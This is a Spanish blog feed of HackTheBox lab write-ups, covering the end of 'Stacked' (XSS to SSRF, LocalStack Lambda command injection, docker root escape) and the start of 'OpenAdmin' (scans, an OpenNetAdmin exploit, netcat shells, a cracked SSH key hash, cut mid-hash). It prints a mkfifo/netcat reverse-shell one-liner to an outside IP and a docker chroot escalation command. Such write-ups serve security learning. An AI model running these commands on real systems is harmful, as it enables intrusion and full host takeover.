&lt;p&gt;Este envia una petición GET a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://mail.stacked.htb/read-mail.php?id=1&lt;/code&gt; desde la instancia del usuario, almacenaba la respuesta en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;response&lt;/code&gt; y hace otra petición POST a mi sesión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; con el contenido de la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;response&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Apunte a mi archivo JS desde el XSS y recibí una conexión por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt;, abrí un servidor por Python y mire que tenía esta segunda página.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162546991-eb57a5f8-984b-4d79-a836-f12d605fe546.png&quot; alt=&quot;subdominio&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Había un mensaje: &lt;em&gt;Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Este decía que configure la instancia de S3 en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3-testing.stacked.htb&lt;/code&gt;, este era un nuevo subdominio que no tenía, por lo que lo añadí al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162547200-0e4ff1cc-fa24-4b70-9d47-42613ce5ab25.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;s3-testingstackedhtb&quot;&gt;s3-testing.stacked.htb&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162547229-c2a8df2c-cf15-43b4-b484-8097a51b4b72.png&quot; alt=&quot;s3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al parecer era una API de AWS, viendo esto me acordé del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; el cual contenía información sobre un servicio AWS en local.&lt;/p&gt;

&lt;p&gt;Buscando vulnerabilidades de LocalStack encontre lo siguiente:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162548008-b6c6c6da-fc2f-49d8-8e00-fd07ded05450.png&quot; alt=&quot;Captura de pantalla 27&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podía abusar del parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;functionName&lt;/code&gt; en la creación de funciones lambda para inyectar mi código malicioso y así ganar &lt;em&gt;RCE&lt;/em&gt;. Yo tenía conectividad con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3-testing.stacked.htb&lt;/code&gt; el cual me permitiría crear funciones lambda.&lt;/p&gt;

&lt;p&gt;Tras una pequeña búsqueda encontré la manera de crear una función lambda, esta se podía crear en más de un lenguaje, pero yo lo hice con Node.js.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162548407-a7edec2c-9895-4e7a-88bd-ed06a3a50fba.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Guarde el siguiente código en un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda.js&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Hacked&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Este debía estar comprimido en ZIP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162548681-e9ed776d-d38f-43c7-839e-241e252323ab.png&quot; alt=&quot;ziplambda&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para crear la función debía especificarle ciertos parámetros.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162548779-ede0739e-2266-4289-b29c-b64d7e9a0f85.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Deje todos por defecto menos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function-name&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip-file&lt;/code&gt;, en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function-name&lt;/code&gt; le inyecte mi código malicioso, y en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip-file&lt;/code&gt; la ruta del ZIP que contenía &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda.js&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;El siguiente paso fue usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awscli&lt;/code&gt; para interactuar con la API y así crear mi función lambda.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162548887-87615e4f-c452-4034-b658-bf520ac56df8.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Se me creo mi función lambda, pero tenía que invocarla, para ello use el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;invoke&lt;/code&gt; especificándole &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function-name&lt;/code&gt; y exportando el resultado en un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;output&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162548957-73e9d679-a8a5-49fc-b4b4-ef37401a9ced.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;rce&quot;&gt;RCE&lt;/h3&gt;

&lt;p&gt;La ejecución remota de comandos solo se acontecía si el usuario visitaba el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dashboard&lt;/code&gt;, en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; vi que este podría estar montado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://127.0.0.1:8080/&lt;/code&gt; pero yo no tenía acceso a él externamente, por lo que aproveche el XSS para redirigir el usuario con el objeto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document.location&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162549411-2edc91d7-7d62-4a61-9019-ca3bd11290f1.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Un tiempo después recibí una petición GET a mi servidor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162549109-72c7e9a8-04e1-4ff1-aaff-2c8c83b68a8e.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya tenía ejecución remota de comandos, ahora solo me faltaba ganar acceso a la máquina, para ello concatené un Shell inverso con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfifo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162549320-3291c746-de1a-4597-98ea-7b48e42bde57.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Invoque la función, redirigí al usuario y gane una Shell en un contenedor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162549540-b85922a2-7f19-4cba-a367-6308123a7dab.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;usertxt&quot;&gt;user.txt&lt;/h3&gt;

&lt;p&gt;Ya podía visualizar la &lt;em&gt;flag&lt;/em&gt; del usuario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162549771-afb6a3bf-1c50-4db6-980a-78a9af2799aa.png&quot; alt=&quot;usetxt&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;ESCALADA DE PRIVILEGIOS&lt;/h3&gt;

&lt;p&gt;Para la escalada de privilegios me transferí &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pspy64&lt;/code&gt; y vi las tareas que se ejecutaban a intervalos regulares de tiempo.&lt;/p&gt;

&lt;p&gt;Vi que se ejecutaba Docker concatenando el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--handler&lt;/code&gt; a la hora de crear la función lambda, por lo que si creaba mi función añadiendo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;amp;gt;&amp;amp;1|nc 10.10.16.59 443 &amp;amp;gt;/tmp/f)&lt;/code&gt; era muy probable que me ejecutara el comando y ganase acceso como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; en el contenedor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162550680-a2f79325-d58c-4443-9d8f-0e2f3d6bfc86.png&quot; alt=&quot;shellcomorootencontentedor&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora podia ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt; con sudo, me dirigí a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gtfobins&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162550803-31a19264-9028-4e15-9b6d-b353e12a5618.png&quot; alt=&quot;Captura de pantalla 28&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Utilice el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt sh&lt;/code&gt; para crear una montura raíz de la máquina en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162550953-cb22a129-092a-440b-bad7-d9fcefaa12cb.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;roottxt&quot;&gt;root.txt&lt;/h3&gt;

&lt;p&gt;Me entable otro Shell inverso por netcat y me ejecute una bash al nuevo contenedor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt; en ejecución, ya pude visualizar la &lt;em&gt;flag&lt;/em&gt; de root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162551321-5a1dd834-02ee-4f32-ae73-ab7d297ab8e8.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;</content><author><name>Fr4nzisko</name></author><category term="HackTheBox" /><category term="AWS" /><category term="XSS" /><category term="SSRF" /><category term="Docker" /><summary type="html">Esta es una máquina de dificultad loca, para la intrusión aproveché XSS para derivar a SSRF y de este modo ganar acceso abusando de la creación de funciones lambda de AWS. Para la escalada de privilegios encontré una tarea que se ejecutaba a intervalos regulares de tiempo, esta concatenaba el parámetro --handler a la hora de crear la función lambda por lo que conseguí inyectar comandos y convertirme en root en el contenedor.</summary></entry><entry><title type="html">OpenAdmin - HackTheBox</title><link href="http://localhost:4000/hackthebox/OpenAdmin/" rel="alternate" type="text/html" title="OpenAdmin - HackTheBox" /><published>2021-07-12T00:00:00-04:00</published><updated>2021-07-12T00:00:00-04:00</updated><id>http://localhost:4000/hackthebox/OpenAdmin</id><content type="html" xml:base="http://localhost:4000/hackthebox/OpenAdmin/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125315417-67da5380-e337-11eb-844d-ab46b6686a1a.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Comencé haciendo un escaneo con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; para detectar puertos abiertos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[Fr4nzisko@RedTeam]─[/home/Fr4nzisko/Desktop]
└──╼ nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5000 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.171 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allports 
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-07-11 18:33 CEST
Initiating SYN Stealth Scan at 18:33
Scanning 10.10.10.171 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
Discovered open port 80/tcp on 10.10.10.171
Discovered open port 22/tcp on 10.10.10.171
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.171 from 0 to 5 due to max_successful_tryno increase to 4
Completed SYN Stealth Scan at 18:33, 13.67s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.171
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.049s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;13.81 seconds
           Raw packets sent: 69669 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.065MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 69574 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.785MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luego efectúe otro escaneo de la versión y servicios que estaban corriendo en cada puerto encontrado.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[Fr4nzisko@RedTeam]─[/home/Fr4nzisko/Desktop]
└──╼ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.10.171 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted       
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-07-11 18:33 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.171
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.042s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;10.90 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tenía dos puertos abiertos, uno era un servidor web y el otro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, el servidor web traía la página de apache por defecto por lo que recurrí a hacer un fuzzing para encontrar directorios, antes de utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; hice uso del script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http-enum&lt;/code&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; que hace uso de un diccionario mucho más pequeño.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[Fr4nzisko@RedTeam]─[/home/Fr4nzisko/Desktop]
└──╼ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum 10.10.10.171          
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-07-11 18:34 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.171
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.066s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;12.02 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como no me encontró nada hice uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;, me encontró tres directorios interesantes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125317595-69a51680-e339-11eb-8d20-3cf019af1004.png&quot; alt=&quot;segunda (1)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125317656-76296f00-e339-11eb-8873-a611a8063fd2.png&quot; alt=&quot;cuarta (1)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125317713-82adc780-e339-11eb-8c0b-1eaba055bac2.png&quot; alt=&quot;tercer&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En la tercera página, al hacer clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; te redirigía a un panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125317855-9b1de200-e339-11eb-9bcd-cd5033b0e51c.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probé a ver el código fuente de la página para ver como se llamaba el panel y buscar si hay algún exploit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125318036-c6083600-e339-11eb-991e-7aa1a213c770.png&quot; alt=&quot;codigofuente&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Se llamaba &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenNetAdmin&lt;/code&gt;, me fui a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;seachsploit&lt;/code&gt; y encontré un exploit que me permitía ganar ejecución de código arbitrario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125318224-f4861100-e339-11eb-9697-c494d4bb9787.png&quot; alt=&quot;opennetadmin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo ejecuté dando los parámetros que me solicitaba y me otorgo una Shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125318381-141d3980-e33a-11eb-90ca-69ba380e259d.png&quot; alt=&quot;ona&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta Shell no me permitía hacer un tratamiento de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TTY&lt;/code&gt;  y encima no funcionaba para volver directorios atras y permanecer, porque te ejecuta un comando y se reinicia, por lo que pensé en entablarme una reverse Shell por netcat desde la que tenía.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125318568-3f078d80-e33a-11eb-93ea-f7ca3e763b0a.png&quot; alt=&quot;netcat&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora ya me dejo hacer el tratamiento de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TTY&lt;/code&gt; y poder manejarme de una manera mucho más cómoda, era el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; por lo que no tenía tantos privilegios, al ir a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;home&lt;/code&gt; vi que habían dos usuarios, uno llamad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jimmy&lt;/code&gt; y otro llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joanna&lt;/code&gt;, entonces pensé en que me tenía que convertir en uno y luego en el otro y ya después hacer la escalada, tras una pequeña investigación encontré un archivo que tenía credenciales.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125319062-bb01d580-e33a-11eb-8261-303d539c856d.png&quot; alt=&quot;credenciales (1)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probé a autenticarme en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joanna&lt;/code&gt; y no funciono, pero cuando probé con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jimmy&lt;/code&gt; i si me autentico, ahora tenía que convertirme en el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joanna&lt;/code&gt;, me descargue &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; de GitHub y me abrí un servidor por Python para transferirlo a la máquina víctima, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas&lt;/code&gt; me encontró que había puertos abiertos en la máquina internamente, antes de recurrir a hacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;port forwarding&lt;/code&gt;para ver que tenía cada puerto, seguí investigando un poco más hasta que encontré un archivo  PHP en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/internal&lt;/code&gt; que devolvia la id_rsa en texto claro, viendo lo que tenía hasta ahora, pense en que quizas ese archivo estaba corriendo por el puerto que me encontró &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas&lt;/code&gt; el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;52847&lt;/code&gt;, hice un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; a ese archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.php&lt;/code&gt; desde la máquina víctima y me reporto la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; en texto claro, pero estaba encriptada, hice uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh2john&lt;/code&gt; para que me devuelva hash equivalente.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[Fr4nzisko@RedTeam]─[/home/Fr4nzisko/Desktop]
└──╼ python /usr/share/john/ssh2john.py id_rsa 
id_rsa:&lt;span class=&quot;nv&quot;&gt;$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e16